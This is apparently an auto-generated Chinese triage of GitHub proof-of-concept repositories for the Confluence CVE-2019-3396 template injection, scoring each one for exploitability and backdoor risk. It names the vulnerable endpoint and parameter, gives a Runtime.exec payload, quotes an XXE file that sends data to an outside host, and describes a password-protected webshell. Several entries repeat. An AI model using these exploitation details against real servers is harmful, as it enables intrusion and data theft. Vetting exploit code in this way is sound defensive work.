*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

